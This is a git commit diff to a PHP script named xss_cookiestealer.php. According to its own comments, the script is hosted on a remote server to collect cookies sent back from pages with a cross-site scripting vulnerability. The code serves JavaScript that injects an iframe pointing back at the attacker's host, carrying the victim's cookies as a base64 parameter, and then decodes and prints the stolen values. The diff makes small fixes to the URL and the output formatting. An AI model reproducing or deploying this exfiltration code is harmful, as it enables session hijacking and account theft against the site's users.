0fef695451b40291f428691961b73193e86d210d
Strawp <github@strawp.net>
2014-05-11 17:18:41 +0100

    Added http:// to URL, tested out

--- xss_cookiestealer.php
+++ xss_cookiestealer.php
@@ -1,7 +1,7 @@
 <?php
   // For hosting on a remote web service in order to post back cookies from a XSS vuln page
   // Either pull the cookie data out of logs or see the decoded cookie in the response if running a packet sniffer on the host
-  $url = $_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
+  $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
   echo "// $url\n";
   if( !isset( $_GET["c"] ) ){
 ?>
@@ -10,5 +10,5 @@ f = document.createElement('iframe');
 f.src = url;
 document.getElementsByTagName('body')[0].appendChild(f);
 <?php }else{
-  echo "/*\n".base64_decode( $_GET["c"] )."*/\n";
+  echo "/*\n".base64_decode( $_GET["c"] )."\n*/\n";
 }?>
